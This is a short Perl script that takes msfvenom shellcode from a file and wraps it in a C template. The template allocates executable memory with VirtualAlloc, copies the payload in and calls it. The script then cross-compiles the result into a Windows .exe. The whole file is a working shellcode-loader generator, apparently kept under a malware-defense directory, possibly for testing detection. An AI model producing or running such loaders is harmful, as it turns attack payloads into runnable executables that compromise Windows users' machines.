#!/usr/bin/perl
use strict;
use warnings;

MAIN:{
my $targetFolder = "/opt/malwaredefense/current";
&startShellcodeTemplate(631,"$targetFolder/115-Stalwart-0000-CShellCode-64enc.c", "$targetFolder/115-Stalwart-0000-Templated-64enc.exe");
}

sub startShellcodeTemplate{
  my($venomFile, $VENOM, $codeSize, $outCFile,$outEXEFile, $OUTPUT);
  $codeSize = shift;
  $venomFile = shift;
  $outEXEFile = shift;
  $outCFile = $outEXEFile;
  $outCFile =~ s/exe$/c/; 
  open($OUTPUT, ">",$outCFile);
  print $OUTPUT <<SHELL_CODE_TEMPLATE_START;
#include <stdio.h>
#include <windows.h> //VirtualAlloc is defined here
//YOU MUST REPLACE the buf and the size 
SHELL_CODE_TEMPLATE_START
  open($VENOM, "<",$venomFile); 
  print $OUTPUT "size_t size = $codeSize; //size of buf in bytes (output by msfvenom)\n\n";
  while(<$VENOM>){
    print $OUTPUT $_;
  }
  close($VENOM);
  print $OUTPUT <<SHELL_CODE_TEMPLATE_END;
int main(int argc, char **argv) {
char *code;                     //Holds a memory address
code = (char *)VirtualAlloc(    //Allocate a chunk of memory and store the starting address
        NULL, size, MEM_COMMIT,     
        PAGE_EXECUTE_READWRITE  //Set the memory to be writable and executable
    );
memcpy(code, buf, size);    //Copy our spud into the executable section of memory
((void(*)())code)();            //Cast the executable memory to a function pointer and run it 
return(0);
}
SHELL_CODE_TEMPLATE_END
  close($OUTPUT);
  $outEXEFile = $outCFile;
  $outEXEFile =~ s/c$/exe/;
  $_=$outEXEFile;
  if (/64/){
    `x86_64-w64-mingw32-gcc $outCFile -o $outEXEFile`;
  }else{
    `i686-w64-mingw32-gcc $outCFile  -o $outEXEFile`;
  }
  print "Completed gerneration of $outEXEFile\n";
}


